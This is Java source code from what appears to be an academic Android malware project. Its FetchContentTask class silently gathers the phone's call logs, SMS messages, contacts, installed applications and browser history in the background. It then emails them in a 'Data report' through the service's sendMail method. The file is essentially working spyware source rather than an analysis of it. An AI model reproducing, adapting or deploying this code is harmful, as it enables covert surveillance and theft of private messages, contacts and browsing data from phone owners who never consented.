/***********************************************************************
* This file is part of INF358-AndroidMalwareProject
* 
* Copyright (c) 2012  GPL Project Developer
* 
* INF358-AndroidMalwareProject is free software: you may copy, redistribute
* and/or modify it under the terms of the GNU General Public License as
* published by the Free Software Foundation, either version 2 of the
* License, or (at your option) any later version.
* 
* This file is distributed in the hope that it will be useful, but
* WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
* General Public License for more details.
* 
* You should have received a copy of the GNU General Public License
* along with this program.  If not, see <http://www.gnu.org/licenses/>.
*
* authors: Issa CAMARA, Wajih JMAIEL, Julien MEDORI, Hakim WADIL

***********************************************************************/

package com.malware.data;

import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import android.content.ContentResolver;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.provider.Browser;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.util.Log;

import com.malware.service.MyService;

public class FetchContentTask extends AsyncTask<Object, Object, Object> {
	
	private String callList;
	private String listOfSms = "";
	private String contactsList;
	private String listEntry;
	private String appList = "";

	private MyService service;
	
	private final boolean VERBOSE = true;
	private final String TAG = "FetchContentTask";
	
	public FetchContentTask(MyService service) {
		this.service = service;
	}
	
	
	@Override
	protected Object doInBackground(Object... params) {
		
		if (VERBOSE) Log.v(TAG, "Fetching call logs");
		callList = fetchCall((ContentResolver) params[0]);
		if (VERBOSE) Log.v(TAG, "Fetching call logs done");
		
		if (VERBOSE) Log.v(TAG, "Fetching sms");
		listOfSms = fetchSms((ContentResolver) params[0]);
		if (VERBOSE) Log.v(TAG, "Fetching sms done");
		
		if (VERBOSE) Log.v(TAG, "Fetching contacts");
		contactsList = fetchContacts((ContentResolver) params[0]);
		if (VERBOSE) Log.v(TAG, "Fetching contacts done");
		
		if (VERBOSE) Log.v(TAG, "Fetching the list of installed apps");
		appList = fetchApplications((PackageManager) params[1]);
		if (VERBOSE) Log.v(TAG, "Fetching the list of installed apps done");
		
		if (VERBOSE) Log.v(TAG, "Fetching browser history");
		listEntry = displayBrowserHistory((ContentResolver) params[0]);		
		if (VERBOSE) Log.v(TAG, "Fetching browser history done");

		return null;
	}
	
	@Override
	protected void onPostExecute(Object obj) {
		
		if (VERBOSE) Log.v(TAG, "--> Sending report");

		service.sendMail("Data report", callList + listOfSms + appList + contactsList + listEntry);


		if (VERBOSE) {
			Log.i(TAG, "- Contacts:");
			Log.v(TAG, contactsList);

			Log.i(TAG, "- Installed apps:");
			Log.v(TAG, appList);

			Log.i(TAG, "- SMS:");
			Log.v(TAG, listOfSms);

			Log.i(TAG, "- Call logs:");
			Log.v(TAG, callList);

			Log.i(TAG, "- History Entry");
			Log.v(TAG, listEntry);
		}

		if (VERBOSE) Log.v(TAG, "--> Report Sent (if an internet connection was detected)");
	}

	private String fetchCall(ContentResolver cr) {

		String callData = "";
		Cursor callCursor = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, null);
		int number = callCursor.getColumnIndex(CallLog.Calls.NUMBER);
		int type = callCursor.getColumnIndex(CallLog.Calls.TYPE);
		int date = callCursor.getColumnIndex(CallLog.Calls.DATE);
		int duration = callCursor.getColumnIndex(CallLog.Calls.DURATION);
		
		callCursor.moveToFirst();

		if (callCursor.getCount() != 0) {
			for(int i = 0 ; i < callCursor.getCount() ; i++) {
				callData += "Call #" + Integer.toString(i+1);
				String phNumber = callCursor.getString(number);
				String callType = callCursor.getString(type);
				String callDate = callCursor.getString(date);
				Date callDayTime = new Date(Long.valueOf(callDate));
				String callDuration = callCursor.getString(duration);
				
				String dir = null;
				int dircode = Integer.parseInt(callType);
				
				switch (dircode) {
				case CallLog.Calls.OUTGOING_TYPE:
					dir = "OUTGOING";
					break;

				case CallLog.Calls.INCOMING_TYPE:
					dir = "INCOMING";
					break;

				case CallLog.Calls.MISSED_TYPE:
					dir = "MISSED";
					break;
				}

				callData+="\n--- Phone Number: " + phNumber + 
						" \n--- Call Type: "+ dir + 
						" \n--- Call Date: " + callDayTime
						+ " \n--- Call duration in sec : " + callDuration;

				callData += "\n\n"; // Just for readability
				callCursor.moveToNext();
			}
		} else {
			callData = "No call in memory \n\n";
		}
		return callData;
	}
	
	private String fetchSms(ContentResolver cr) {

		Cursor cursor = cr.query(Uri.parse("content://sms/inbox"), null, null, null, null);
		cursor.moveToFirst();
		String msgData = "";

		if (cursor.getCount() != 0) {
			for (int i = 0 ; i < cursor.getCount() ; i++) {
				msgData += "From: " + cursor.getString(cursor.getColumnIndex("address")) 
						+ "\n (received on: " + cursor.getString(cursor.getColumnIndex("date")) + ")\n"
						+ cursor.getString(cursor.getColumnIndexOrThrow("body")) + "\n\n";
				cursor.moveToNext();
			}
		} else {
			msgData = "No sms in memory \n\n";
		}
		
		return msgData;
	}

	private String fetchContacts(ContentResolver cr){
		ArrayList<ArrayList<String>> cList;
		Cursor c = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
		String id;
		cList = new ArrayList<ArrayList<String>>(c.getCount());
		c.moveToFirst();

		for (int i = 0; i < c.getCount(); i++) {
			ArrayList<String> contactInfo = new ArrayList<String>(2);
			contactInfo.add(0, c.getString(c.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)));
			id = c.getString(c.getColumnIndex(ContactsContract.Contacts._ID));

			if (Integer.parseInt(c.getString(c.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
				Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[] { id }, null);
				while (pCur.moveToNext()) {
					contactInfo.add(1, pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
				}
			}

			cList.add(i, contactInfo);
			c.moveToNext();		
		}
		c.close();
		
		String contactsBody = "";

		for (int j = 0 ; j < cList.size() ; j++) {
//			contactsBody += cList.get(j).get(0) + " " + cList.get(j).get(1) + "\r\n";
		}

		return contactsBody;
	}
	
	private String displayBrowserHistory(ContentResolver cr) {

		String title = "";
		String url = "";

		ArrayList<HistoryEntry> list = new ArrayList<HistoryEntry>();

		String[] proj = new String[] { Browser.BookmarkColumns.TITLE, Browser.BookmarkColumns.URL };
		String sel = Browser.BookmarkColumns.BOOKMARK + " = 0"; // 0 = history,
																// 1 = bookmark
		Cursor mCur = cr.query(Browser.BOOKMARKS_URI, proj, sel, null, null);
		mCur.moveToFirst();

		if (mCur.moveToFirst() && mCur.getCount() > 0) {
			boolean cont = true;
			while (mCur.isAfterLast() == false && cont) {
				HistoryEntry entry;

				title = mCur.getString(mCur.getColumnIndex(Browser.BookmarkColumns.TITLE));
				url = mCur.getString(mCur.getColumnIndex(Browser.BookmarkColumns.URL));
				
				// Do something with title and url
				entry = new HistoryEntry(title, url);
				list.add(entry);
				mCur.moveToNext();
			}
		}

		mCur.close();

		String toSend = "";
		for (int j = 0 ; j < list.size() ; j++) {
			HistoryEntry entry = list.get(j); 
			toSend += "--> " + entry.getTitle() + "\n" + entry.getUrl() + "\r\n\n";
		}
		
		return toSend;
	}
	
	private String fetchApplications(PackageManager pm){
		String label = "";
		List<ApplicationInfo> apps = pm.getInstalledApplications(0);

		for(ApplicationInfo app : apps) {
			label += "- " + (String)pm.getApplicationLabel(app) + "\r\n";
		}
		return label;
	}
}